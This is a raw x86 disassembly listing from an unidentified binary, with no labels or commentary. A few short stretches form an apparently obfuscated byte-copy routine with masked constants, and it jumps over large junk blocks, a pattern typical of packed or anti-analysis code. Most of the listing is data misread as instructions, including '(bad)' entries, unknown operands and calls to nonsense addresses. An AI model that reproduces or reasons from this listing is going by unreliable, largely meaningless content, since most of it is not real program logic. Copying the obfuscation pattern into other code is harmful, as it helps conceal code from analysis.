  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x2b4d34c7]
  40f540:	jmp    0x7d7c:0x7e7eacd4
  40f547:	jle    0x40f5c7
  40f549:	xor    dh,0x63
  40f54c:	cmp    DWORD PTR [eax],eax
  40f54e:	sub    eax,DWORD PTR [esi]
  40f550:	test   BYTE PTR [ebp+0x6b1d5759],cl
  40f556:	aad    0xe1
  40f558:	stos   BYTE PTR es:[edi],al
  40f559:	and    bl,ch
  40f55b:	(bad)  
  40f55c:	call   0xef5e165d
  40f561:	mov    edi,edx
  40f563:	ret    
  40f564:	mov    edi,?
  40f566:	test   eax,0x253d57a6
  40f56b:	mov    DWORD PTR [edi],edi
  40f56d:	in     al,0x44
  40f56f:	cmp    al,0x63
  40f571:	dec    edi
  40f572:	(bad)  
  40f573:	(bad)  
  40f574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f575:	inc    esi
  40f576:	cmc    
  40f577:	mov    DWORD PTR gs:[esi+0x433b73ae],esp
  40f57e:	inc    ecx
  40f57f:	add    ah,BYTE PTR [ebp+eiz*8-0x3d]
  40f583:	ret    
  40f584:	(bad)  
  40f585:	cld    
  40f586:	loop   0x40f577
  40f588:	cmp    dl,BYTE PTR [edx+0x50549c6b]
  40f58e:	xchg   esi,eax
  40f58f:	(bad)  
  40f590:	outs   dx,DWORD PTR ds:[esi]
  40f591:	ficomp WORD PTR [ecx+0x6ea848f1]
  40f597:	xchg   edi,eax
  40f598:	aam    0x2e
  40f59a:	(bad)  
  40f59b:	mov    cl,0x24
  40f59d:	mov    fs:0xe6d69161,eax
  40f5a3:	inc    ebp
  40f5a4:	sub    eax,0x2602f5f5
  40f5a9:	and    DWORD PTR [ebx-0x4533ea22],ebp
  40f5af:	call   0x3ad3:0xe5f8024
  40f5b6:	ret    
  40f5b7:	ins    DWORD PTR es:[edi],dx
  40f5b8:	lods   al,BYTE PTR ds:[esi]
  40f5b9:	mov    esp,0xad99e5ca
  40f5be:	sbb    edi,DWORD PTR [eax-0x6ad9780d]
  40f5c4:	pushf  
  40f5c5:	sti    
  40f5c6:	rcl    edi,cl
  40f5c8:	sbb    eax,0xf5bdc6c6
  40f5cd:	cmp    DWORD PTR [edx+0x4df3e668],ebx
  40f5d3:	xacquire xchg BYTE PTR ds:[edx+ebp*1-0x56],bl
  40f5d9:	dec    ebp
  40f5da:	sub    BYTE PTR [esi],al
  40f5dc:	iret   
  40f5dd:	xchg   esi,eax
  40f5de:	jbe    0x40f5fb
  40f5e0:	push   ds
  40f5e1:	or     eax,0xbf20821e
  40f5e6:	jle    0x40f57e
  40f5e8:	sbb    bl,BYTE PTR [eax+0xb]
  40f5eb:	xor    ebp,DWORD PTR [ecx]
  40f5ed:	add    al,0x7a
  40f5ef:	pushf  
  40f5f0:	test   al,0x59
  40f5f2:	retf   0x93d0
  40f5f5:	mov    DWORD PTR [edi],ebx
  40f5f7:	(bad)  
  40f5f8:	scas   al,BYTE PTR es:[edi]
  40f5f9:	xchg   edi,eax
  40f5fa:	pop    ecx
  40f5fb:	mov    bl,0x44
  40f5fd:	leave  
  40f5fe:	mov    dl,BYTE PTR [ebx-0x3b]
  40f601:	push   esp
  40f602:	lods   eax,DWORD PTR ds:[esi]
  40f603:	mov    dh,bh
  40f605:	pop    DWORD PTR [esi]
  40f607:	jecxz  0x40f5a1
  40f609:	cld    
  40f60a:	inc    ecx
  40f60b:	pop    ecx
  40f60c:	fcmovnbe st,st(3)
  40f60e:	hlt    
  40f60f:	ret    
  40f610:	xor    BYTE PTR [ecx],bl
  40f612:	mov    edx,0x41d8149f
  40f617:	aaa    
  40f618:	sti    
  40f619:	int3   
  40f61a:	jbe    0x40f611
  40f61c:	mov    bh,0x82
  40f61e:	cwde   
  40f61f:	ins    BYTE PTR es:[edi],dx
  40f620:	jb     0x40f607
  40f622:	(bad)  
  40f623:	stos   BYTE PTR es:[edi],al
  40f624:	push   cs
  40f625:	sbb    bh,BYTE PTR [edx+0x28378b90]
  40f62b:	mov    WORD PTR [edi-0x71b591bd],?
  40f631:	in     eax,dx
  40f632:	add    al,0x1d
  40f634:	mov    ebx,0x820fc93
  40f639:	and    BYTE PTR ds:0x7eedfcb,bh
  40f63f:	xchg   edi,eax
  40f640:	fdivr  QWORD PTR [ebp-0x1]
  40f643:	sti    
  40f644:	xor    edi,edx
  40f646:	adc    al,0xe7
  40f648:	mov    bh,0xb2
  40f64a:	jne    0x40f699
  40f64c:	mov    ds:0xd4ce8218,eax
  40f651:	or     eax,0x7a528c68
  40f656:	cmp    ebx,DWORD PTR [edx-0x3937fc7d]
  40f65c:	out    dx,eax
  40f65d:	push   ebx
  40f65e:	push   ebx
  40f65f:	adc    eax,0x8ac4c437
  40f664:	mov    bh,0xb5
  40f666:	out    0x1d,eax
  40f668:	xor    ch,BYTE PTR [eax+eiz*8+0x7e]
  40f66c:	sahf   
  40f66d:	push   ecx
  40f66e:	out    dx,eax
  40f66f:	aas    
  40f670:	test   al,ah
  40f672:	add    edi,ecx
  40f674:	scas   al,BYTE PTR es:[edi]
  40f675:	inc    ebp
  40f676:	cmp    DWORD PTR [ebx],ebp
  40f678:	sbb    BYTE PTR [ebx],ch
  40f67a:	pop    ss
  40f67b:	add    al,0xd4
  40f67d:	cwde   
  40f67e:	sub    eax,0xc0017a4b
  40f683:	sbb    ch,BYTE PTR [edi]
  40f685:	xchg   edi,edx
  40f687:	shl    DWORD PTR [esi-0x26],cl
  40f68a:	cmp    dh,al
  40f68c:	cdq    
  40f68d:	adc    eax,0x47e2facf
  40f692:	xlat   BYTE PTR ds:[ebx]
  40f693:	pop    esi
  40f694:	or     al,0xa1
  40f696:	mov    ebx,0x3d3110ea
  40f69b:	test   DWORD PTR [edx+0x30],ebp
  40f69e:	int    0x91
  40f6a0:	sub    DWORD PTR [edi+esi*8-0x42],esi
  40f6a4:	in     eax,0x2a
  40f6a6:	(bad)
  40f6a9:	cli    
  40f6aa:	push   0x51a942f1
  40f6af:	sbb    al,0x77
  40f6b1:	sub    eax,0x69c1a27a
  40f6b6:	cli    
  40f6b7:	mov    DWORD PTR [edi],edx
  40f6b9:	jnp    0x40f646
  40f6bb:	cmp    dl,BYTE PTR [ecx+eiz*4]
  40f6be:	pop    es
  40f6bf:	rcr    DWORD PTR [ebp+0x7904511a],1
  40f6c5:	shl    DWORD PTR [esi],cl
  40f6c7:	or     eax,0x88399902
  40f6cc:	arpl   WORD PTR [ebx+ebx*2],si
  40f6cf:	mov    ebx,eax
  40f6d1:	leave  
  40f6d2:	call   0xdbdce8e3
  40f6d7:	dec    ecx
  40f6d8:	or     al,0xb4
  40f6da:	int    0x9f
  40f6dc:	out    dx,eax
  40f6dd:	push   edx
  40f6de:	(bad)  
  40f6df:	mov    ah,0x4
  40f6e1:	or     al,BYTE PTR [edi+0x18]
  40f6e4:	xchg   ecx,eax
  40f6e5:	cmp    al,0xf6
  40f6e7:	cld    
  40f6e8:	dec    esp
  40f6e9:	popf   
  40f6ea:	pop    edi
  40f6eb:	xchg   ebx,eax
  40f6ec:	sub    eax,0x91de62a6
  40f6f1:	push   ebp
  40f6f2:	imul   ebp,DWORD PTR [edi+eiz*1+0x4c],0xf
  40f6f7:	xchg   edx,eax
  40f6f8:	leave  
  40f6f9:	je     0x40f686
  40f6fb:	inc    ebp
  40f6fc:	lahf   
  40f6fd:	mov    eax,0x9293c4c1
  40f702:	sar    DWORD PTR [ecx],cl
  40f704:	mov    esp,0x7f7bf601
  40f709:	cmp    al,0x56
  40f70b:	retf   0xaf80
  40f70e:	dec    ecx
  40f70f:	out    dx,al
  40f710:	cdq    
  40f711:	inc    esi
  40f712:	and    al,0x2e
  40f714:	fisttp WORD PTR [ebp+0x6a]
  40f717:	sub    WORD PTR [esi],cx
  40f71a:	cmp    ebp,esi
  40f71c:	dec    esp
  40f71d:	xchg   edx,eax
  40f71e:	add    ebx,DWORD PTR [esi+eax*4-0x51]
  40f722:	xor    DWORD PTR [edi-0x258ebc0d],ecx
  40f728:	fadd   st,st(1)
  40f72a:	je     0x40f7a5
  40f72c:	hlt    
  40f72d:	and    DWORD PTR [ecx-0x30],eax
  40f730:	fadd   DWORD PTR ds:0x8ccfd64f
  40f736:	cdq    
  40f737:	jno    0x40f6c0
  40f739:	add    BYTE PTR [edi+0x22649a3d],bh
  40f73f:	sub    ecx,0x25ca7e37
  40f745:	cmp    al,BYTE PTR [eax]
  40f747:	sub    BYTE PTR ds:[ebx],bl
  40f74a:	push   ebx
  40f74b:	daa    
  40f74c:	es leave 
  40f74e:	push   ds
  40f74f:	std    
  40f750:	lock dec edx
  40f752:	(bad)  
  40f753:	addr16 inc ebx
  40f755:	fdivr  st,st(2)
  40f757:	mov    esp,0x28063365
  40f75c:	and    BYTE PTR [edx+eax*4-0x40],bh
  40f760:	test   BYTE PTR [ebx-0x317e7c09],0xd2
  40f767:	sbb    al,0x38
  40f769:	push   ss
  40f76a:	std    
  40f76b:	cmp    bh,BYTE PTR [ebp+0x495ad50b]
  40f771:	ja     0x40f783
  40f773:	cwde   
  40f774:	mov    ch,BYTE PTR [ebp-0x1a]
  40f777:	pusha  
  40f778:	mov    dh,0x86
  40f77a:	aad    0xff
  40f77c:	inc    esp
  40f77d:	jno    0x40f748
  40f77f:	push   ebp
  40f780:	aad    0x31
  40f782:	pop    esp
  40f783:	sbb    DWORD PTR [esi+0x70],edi
  40f786:	sub    bl,dh
  40f788:	push   ds
  40f789:	xchg   edx,eax
  40f78a:	push   edx
  40f78b:	out    dx,al
  40f78c:	es pop ds
  40f78e:	jle    0x40f76d
  40f790:	int    0xd
  40f792:	push   cs
  40f793:	sti    
  40f794:	jb     0x40f776
  40f796:	ja     0x40f786
  40f798:	inc    ebp
  40f799:	jb     0x40f804
  40f79b:	cmp    DWORD PTR [ebx+ebp*8+0x1690f654],edx
  40f7a2:	not    DWORD PTR [esp+edi*4+0x29]
  40f7a6:	xor    BYTE PTR [esi+ecx*2],al
  40f7a9:	xor    BYTE PTR [eax],0x7b
  40f7ac:	dec    edx
  40f7ad:	mov    al,ds:0x5769d586
  40f7b2:	sub    BYTE PTR [ebx+0x21330e46],cl
  40f7b8:	mov    WORD PTR [ebx],es
  40f7ba:	xchg   ecx,eax
  40f7bb:	mov    dh,0x50
  40f7bd:	sbb    esi,edx
  40f7bf:	push   edi
  40f7c0:	mov    dh,0x60
  40f7c2:	aam    0xaa
  40f7c4:	inc    esp
  40f7c5:	push   esp
  40f7c6:	sti    
  40f7c7:	sub    al,0xe2
  40f7c9:	aaa    
  40f7ca:	dec    ecx
  40f7cb:	sbb    eax,0x973e5dc6
  40f7d0:	xor    DWORD PTR [esi+0x4fc43297],0x270be1c8
  40f7da:	mov    al,0x99
  40f7dc:	jecxz  0x40f7c1
  40f7de:	ss jge 0x40f7cd
  40f7e1:	xor    al,0x3e
  40f7e3:	loopne 0x40f7ed
  40f7e5:	xor    al,0x4e
  40f7e7:	xchg   ebp,eax
  40f7e8:	cs dec eax
  40f7ea:	xchg   ebx,eax
  40f7eb:	sub    al,0xd5
  40f7ed:	adc    BYTE PTR [eax+0x57fdf7c1],bh
  40f7f3:	mov    esp,0xdea5840f
  40f7f8:	fdiv   QWORD PTR [ebp+0x6f]
  40f7fb:	mov    eax,ds:0x804e9279
  40f800:	sub    ebp,esp
  40f802:	ror    edi,1
  40f804:	(bad)  
  40f805:	fidivr WORD PTR [edx+eax*2]
  40f808:	mov    eax,ds:0xa0e92e24
  40f80d:	jnp    0x40f7ed
  40f80f:	push   ebx
  40f810:	jle    0x40f7b7
  40f812:	mov    bh,0x16
  40f814:	sbb    DWORD PTR [ebx],ebx
  40f816:	add    edi,DWORD PTR [edi+0x125d9fbe]
  40f81c:	test   eax,0x3c01725b
  40f821:	push   0xffffffba
  40f823:	mov    edi,0x6806eba5
  40f828:	std    
  40f829:	sahf   
  40f82a:	dec    esi
  40f82b:	and    edi,eax
  40f82d:	inc    ecx
  40f82e:	or     ebp,DWORD PTR ds:0x53856c60
  40f834:	fmul   QWORD PTR [esi-0x3b]
  40f837:	mov    esi,0xc81908e
  40f83c:	and    bh,BYTE PTR [esi-0x1c]
  40f83f:	int    0x49
  40f841:	or     DWORD PTR [ebp+0x22],ebx
  40f844:	cmc    
  40f845:	jno    0x40f7fc
  40f847:	inc    ebp
  40f848:	fnstenv [edx+0x3f93377]
  40f84e:	dec    BYTE PTR [ebx-0x50f0f78b]
  40f854:	cli    
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xbbfc483f
  40f897:	scas   eax,DWORD PTR es:[edi]
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	push   cs
  40f8a1:	sbb    edx,eax
  40f8a3:	lea    esp,[ebp+0x7e242f95]
  40f8a9:	mov    BYTE PTR [edi-0x1],ch
  40f8ac:	adc    ebp,0x61368f53
  40f8b2:	(bad)  
  40f8b3:	imul   edx,DWORD PTR [edi+edx*1+0x18],0x3b52e3a
  40f8bb:	xor    al,0x6c
  40f8bd:	out    0x55,eax
  40f8bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c0:	jl     0x40f8a7
  40f8c2:	add    ebp,esp
  40f8c4:	test   al,0xc4
  40f8c6:	push   ecx
  40f8c7:	out    0xc7,eax
  40f8c9:	push   edi
  40f8ca:	xor    eax,DWORD PTR [esi+ebx*4]
  40f8cd:	and    BYTE PTR [eax-0x6b9c97ca],0x96
  40f8d4:	ja     0x40f945
  40f8d6:	test   al,0x2a
  40f8d8:	xchg   ebx,eax
  40f8d9:	mov    dl,0x61
  40f8db:	int3   
  40f8dc:	jne    0x40f8c3
  40f8de:	xchg   ecx,eax
  40f8df:	dec    esi
  40f8e0:	popa   
  40f8e1:	push   ds
  40f8e2:	push   eax
  40f8e3:	mov    esi,0x571f3942
  40f8e8:	popa   
  40f8e9:	sub    BYTE PTR [edi-0x20],ch
  40f8ec:	pop    ss
  40f8ed:	stos   DWORD PTR es:[edi],eax
  40f8ee:	call   0xe296db2d
  40f8f3:	or     esp,DWORD PTR [ecx-0x30b6c21c]
  40f8f9:	enter  0xf31c,0xfd
  40f8fd:	or     BYTE PTR [edi],al
  40f8ff:	jnp    0x40f8e2
  40f901:	or     eax,0x217b2824
  40f906:	adc    al,0xa2
  40f908:	dec    DWORD PTR [ebx-0x7cdfe3a6]
  40f90e:	mov    ebx,0x29b0e02a
  40f913:	adc    cl,BYTE PTR [edi-0x68]
  40f916:	and    al,0x7f
  40f918:	iret   
  40f919:	lods   al,BYTE PTR ds:[esi]
  40f91a:	arpl   bx,ax
  40f91c:	fiadd  DWORD PTR [esi]
  40f91e:	mov    DWORD PTR [eax+0x461a390d],eax
  40f924:	push   es
  40f925:	add    ebp,esp
  40f927:	adc    DWORD PTR [edx+0x653cfdfb],0xf1b7d13d
  40f931:	out    0x27,al
  40f933:	cld    
  40f934:	xor    dh,BYTE PTR [esi+0x663ae66a]
  40f93a:	lods   ax,WORD PTR ds:[esi]
  40f93c:	push   ds
  40f93d:	repz mov dl,0x3c
  40f940:	stos   DWORD PTR es:[edi],eax
  40f941:	dec    eax
  40f942:	ins    BYTE PTR es:[edi],dx
  40f943:	fwait
  40f944:	retf   
  40f945:	adc    DWORD PTR [ebx+eax*8-0x58],eax
  40f949:	shl    BYTE PTR [edi-0xf],cl
  40f94c:	adc    esp,edx
  40f94e:	jl     0x40f972
  40f950:	hlt    
  40f951:	push   esp
  40f952:	or     esi,DWORD PTR [ebx+ecx*2+0x44]
  40f956:	(bad)  
  40f957:	pop    ecx
  40f958:	pop    edi
  40f959:	jnp    0x40f991
  40f95b:	pop    esp
  40f95c:	cld    
  40f95d:	outs   dx,DWORD PTR ds:[esi]
  40f95e:	sub    al,0x8c
  40f960:	mov    al,ds:0x78a0a03
  40f965:	pop    ss
  40f966:	test   al,0x13
  40f968:	pop    ebp
  40f969:	inc    ecx
  40f96a:	xchg   ebx,eax
  40f96b:	test   al,0x2c
  40f96d:	xchg   ebp,eax
  40f96e:	mov    DWORD PTR [esi],ebp
  40f970:	and    al,0xa5
  40f972:	push   cs
  40f973:	add    bh,BYTE PTR [edx-0x4f939f88]
  40f979:	jge    0x40f930
  40f97b:	mov    bl,dl
  40f97d:	dec    eax
  40f97e:	pusha  
  40f97f:	and    edi,esp
  40f981:	sti    
  40f982:	mov    BYTE PTR [edx+eiz*1],ch
  40f985:	les    ebp,FWORD PTR [ecx+0x48]
  40f988:	call   0x5337d70f
  40f98d:	stos   BYTE PTR es:[edi],al
  40f98e:	dec    esp
  40f98f:	xchg   ecx,eax
  40f990:	jmp    0x40f9f1
  40f992:	pop    eax
  40f993:	std    
  40f994:	js     0x40f991
  40f996:	mov    WORD PTR ds:0x5d380a1f,fs
  40f99c:	jl     0x40f9e6
  40f99e:	ss cwde 
  40f9a0:	push   edx
  40f9a1:	xlat   BYTE PTR ds:[ebx]
  40f9a2:	dec    esi
  40f9a3:	pop    eax
  40f9a4:	dec    edi
  40f9a5:	pusha  
  40f9a6:	repz sbb dh,BYTE PTR [eax-0x4f]
  40f9aa:	push   0x47
  40f9ac:	cmp    ecx,DWORD PTR [ebx+0x8266b39]
  40f9b2:	loopne 0x40f9ac
  40f9b4:	out    dx,eax
  40f9b5:	or     ebp,DWORD PTR [ecx+0x5efee0ef]
  40f9bb:	and    DWORD PTR [esi+0x3f],edi
  40f9be:	in     eax,dx
  40f9bf:	add    al,0x60
  40f9c1:	sub    al,ah
  40f9c3:	arpl   WORD PTR [ecx-0x17a9b9fd],ax
  40f9c9:	test   al,0x94
  40f9cb:	cmp    DWORD PTR [ebp-0x73],ebx
  40f9ce:	pop    esi
  40f9cf:	mov    bh,0x7f
  40f9d1:	fisub  DWORD PTR [ecx+0x43]
  40f9d4:	and    eax,0xa78c4659
  40f9d9:	lods   al,BYTE PTR ds:[esi]
  40f9da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9db:	sub    al,0x52
  40f9dd:	ins    DWORD PTR es:[edi],dx
  40f9de:	jle    0x40f9c4
  40f9e0:	dec    esi
  40f9e1:	imul   ecx,DWORD PTR [ecx],0xffffffc0
  40f9e4:	fsubr  QWORD PTR [ecx+0x417dfd30]
  40f9ea:	sub    al,0x9f
  40f9ec:	cmc    
  40f9ed:	dec    edx
  40f9ee:	adc    BYTE PTR [esi],ah
  40f9f0:	xchg   DWORD PTR [ebx+edx*8],ecx
  40f9f3:	push   edx
  40f9f4:	outs   dx,BYTE PTR ds:[esi]
  40f9f5:	pop    ebp
  40f9f6:	xchg   ecx,eax
  40f9f7:	test   DWORD PTR [edi-0x41],0x53c9b313
  40f9fe:	xor    al,0x1b
  40fa00:	cmp    DWORD PTR [ebp+0x1ffd8f12],eax
  40fa06:	lahf   
  40fa07:	inc    eax
  40fa08:	mov    al,0x83
  40fa0a:	and    bl,cl
  40fa0c:	mov    al,0x7b
  40fa0e:	inc    edx
  40fa0f:	mov    dl,0xda
  40fa11:	mov    eax,0xb1a6db67
  40fa16:	je     0x40f9bd
  40fa18:	cmp    BYTE PTR [edi+eiz*2-0x7a],bl
  40fa1c:	bnd jmp 0x40f9b5
  40fa1f:	sub    eax,DWORD PTR [edx-0x4b]
  40fa22:	js     0x40f9ce
  40fa24:	arpl   dx,cx
  40fa26:	into   
  40fa27:	push   ds
  40fa28:	jg     0x40f9be
  40fa2a:	mov    WORD PTR [edi+0xae4460c],ss
  40fa30:	imul   edi,DWORD PTR [esi],0x65a6b9cf
  40fa36:	dec    ecx
  40fa37:	scas   eax,DWORD PTR es:[edi]
  40fa38:	gs xchg ecx,eax
  40fa3a:	push   edi
  40fa3b:	syscall 
  40fa3d:	sub    al,0x91
  40fa3f:	xchg   ecx,eax
  40fa40:	lea    ecx,[ebx-0x58]
  40fa43:	push   es
  40fa44:	sahf   
  40fa45:	or     ax,0xba4
  40fa49:	add    DWORD PTR [ecx-0x1],edi
  40fa4c:	push   0xffffff95
  40fa4e:	cmp    eax,esi
  40fa50:	imul   edi,DWORD PTR [edi-0x38],0xf0a87832
  40fa57:	sub    cl,BYTE PTR [ecx-0x47]
  40fa5a:	push   edi
  40fa5b:	mov    ah,0x7
  40fa5d:	mov    ds:0x82a200b9,eax
  40fa62:	outs   dx,BYTE PTR ds:[esi]
  40fa63:	or     BYTE PTR [eax+0x7e138b22],bl
  40fa69:	xchg   ebp,eax
  40fa6a:	push   esi
  40fa6b:	or     DWORD PTR [edx+0x4baa49e2],0x7cc7245b
  40fa75:	mov    ch,BYTE PTR [ebx+0x17]
  40fa78:	inc    ebx
  40fa79:	push   0x671ea3ad
  40fa7e:	addr16 ret 
  40fa80:	arpl   bp,cx
  40fa82:	outs   dx,DWORD PTR ds:[esi]
  40fa83:	cmp    ebp,DWORD PTR [edi]
  40fa85:	call   0x8cb6c980
  40fa8a:	mov    ah,0x4b
  40fa8c:	rcl    DWORD PTR [eax+0x79],cl
  40fa8f:	jg     0x40fa70
  40fa91:	cli    
  40fa92:	inc    esi
  40fa93:	test   DWORD PTR [edx-0x1c],0x3de83f13
  40fa9a:	adc    ah,BYTE PTR [edi-0x55]
  40fa9d:	test   DWORD PTR [ecx],edi
  40fa9f:	popa   
  40faa0:	pop    ecx
  40faa1:	dec    ecx
  40faa2:	retf   0xf492
  40faa5:	jns    0x40fa46
  40faa7:	nop
  40faa8:	imul   esi,DWORD PTR [ecx+0x55],0x6f
  40faac:	lea    ebx,[esi]
  40faae:	sbb    DWORD PTR [ecx-0x13],0xffffff98
  40fab2:	out    0x5d,al
  40fab4:	dec    edi
  40fab5:	aad    0x9b
  40fab7:	xchg   ebp,eax
  40fab8:	jae    0x40faab
  40faba:	push   ecx
  40fabb:	xchg   ebp,eax
  40fabc:	aas    
  40fabd:	dec    edx
  40fabe:	xor    DWORD PTR [ecx],ecx
  40fac0:	hlt    
  40fac1:	xchg   esi,eax
  40fac2:	outs   dx,DWORD PTR ds:[esi]
  40fac3:	lds    edi,FWORD PTR [edx]
  40fac5:	mov    al,0xe5
  40fac7:	and    al,0xd5
  40fac9:	ret    
  40faca:	sub    eax,0xe7273ffe
  40facf:	jecxz  0x40fa86
  40fad1:	dec    eax
  40fad2:	sbb    bl,BYTE PTR [edx-0x605b5eb9]
  40fad8:	jg     0x40fab7
  40fada:	mov    ch,0x50
  40fadc:	push   ds
  40fadd:	in     al,0xed
  40fadf:	add    cl,al
  40fae1:	push   0xffffffa0
  40fae3:	(bad)
  40fae6:	push   cs
  40fae7:	ins    BYTE PTR es:[edi],dx
  40fae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fae9:	vmaxss xmm6,xmm6,DWORD PTR [ecx+0x44]
  40faee:	rol    BYTE PTR [edi-0x15],cl
  40faf1:	into   
  40faf2:	lahf   
  40faf3:	cmp    eax,0x85faf6c
  40faf8:	pushf  
  40faf9:	sub    ch,BYTE PTR ds:0x6ac5b604
  40faff:	jmp    0xb434d979
  40fb04:	jns    0x40fb66
  40fb06:	ins    BYTE PTR es:[edi],dx
  40fb07:	retf   
  40fb08:	repz jae 0x40fb19
  40fb0b:	rol    eax,cl
  40fb0d:	mov    ecx,0x541ac76
  40fb12:	aad    0x3b
  40fb14:	push   0xfffffff8
  40fb16:	mov    ebx,0x1b2cf1dd
  40fb1b:	mov    DWORD PTR [esi-0x17],esi
  40fb1e:	pop    esp
  40fb1f:	mov    bh,0xfe
  40fb21:	fiadd  WORD PTR [ebp-0x39a3d18a]
  40fb27:	(bad)  
  40fb28:	cdq    
  40fb29:	lea    eax,[ebx]
  40fb2b:	imul   esi,DWORD PTR [ecx+0x5d],0xffffffa0
  40fb2f:	jae    0x40fb7f
  40fb31:	ja     0x40fb5f
  40fb33:	push   eax
  40fb34:	call   0x212c:0xca179d51
  40fb3b:	adc    DWORD PTR ds:[esp+edx*8],0xe8900dac
  40fb43:	pop    edx
  40fb44:	vpshaw xmm5,xmm2,[eax+r8d*8-0x8]
  40fb4b:	cmc    
  40fb4c:	push   es
  40fb4d:	sahf   
  40fb4e:	mov    dh,ah
  40fb50:	test   DWORD PTR [ecx+edi*8+0x44],ecx
  40fb54:	retf   
  40fb55:	and    cl,0x98
  40fb58:	cmp    eax,0xbb989d69
  40fb5d:	pop    eax
  40fb5e:	aad    0xe1
  40fb60:	and    BYTE PTR [edx-0x1b796d1a],bl
  40fb66:	adc    al,0xb8
  40fb68:	mov    ebx,0x8fd3d8df
  40fb6d:	shr    DWORD PTR [ecx-0x60e7adf9],1
  40fb73:	jbe    0x40fbaa
  40fb75:	int3   
  40fb76:	push   esi
  40fb77:	stos   DWORD PTR es:[edi],eax
  40fb78:	mov    al,ds:0xfd9d9fa6
  40fb7d:	xlat   BYTE PTR ds:[ebx]
  40fb7e:	ins    BYTE PTR es:[edi],dx
  40fb7f:	jae    0x40fbd3
  40fb81:	in     al,dx
  40fb82:	test   eax,0x8918a19
  40fb88:	xchg   edi,eax
  40fb89:	inc    esp
  40fb8a:	inc    edi
  40fb8b:	sub    BYTE PTR [ebx-0x5b94c081],ch
  40fb91:	add    eax,0xfef53274
  40fb96:	adc    DWORD PTR [esi+0x8eb9460],esi
  40fb9c:	test   DWORD PTR [edi],ebx
  40fb9e:	(bad)  
  40fb9f:	push   cs
  40fba0:	inc    edx
  40fba1:	or     BYTE PTR [edi],0x86
  40fba4:	jns    0x40fb9f
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffb8
  40fbc9:	out    dx,al
  40fbca:	sahf   
  40fbcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	imul   ebx,DWORD PTR ds:0x19ac9906,0xd6595351
  40fbde:	adc    bh,bh
  40fbe0:	ret    0xb5fb
  40fbe3:	shl    BYTE PTR [eax+0x75],1
  40fbe6:	sbb    BYTE PTR [esi-0x1c6139da],dh
  40fbec:	push   ebp
  40fbed:	fsub   QWORD PTR [ecx-0x136e34e1]
  40fbf3:	aaa    
  40fbf4:	mov    ?,WORD PTR [edi+0x55]
  40fbf7:	sbb    dl,0xb8
  40fbfa:	lods   eax,DWORD PTR ds:[esi]
  40fbfb:	pop    edx
  40fbfc:	sti    
  40fbfd:	mov    bl,bh
  40fbff:	in     al,0x70
  40fc01:	hlt    
  40fc02:	inc    edi
  40fc03:	mov    dh,0xbe
  40fc05:	int    0xde
  40fc07:	adc    al,0x26
  40fc09:	inc    edx
  40fc0a:	(bad)  
  40fc0b:	pop    ebp
  40fc0c:	cmp    BYTE PTR [edi+0x1f],bh
  40fc0f:	hlt    
  40fc10:	fld    DWORD PTR [ebp-0x4e]
  40fc13:	mov    eax,cs:0x8b8df94a
  40fc19:	xchg   edx,eax
  40fc1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc1b:	push   ds
  40fc1c:	jnp    0x40fc0d
  40fc1e:	(bad)  
  40fc1f:	push   edi
  40fc20:	sbb    DWORD PTR [eax+0x4aa84ce],edx
  40fc26:	jecxz  0x40fbad
  40fc28:	ficomp DWORD PTR [edx-0x273e393b]
  40fc2e:	add    ebx,edx
  40fc30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
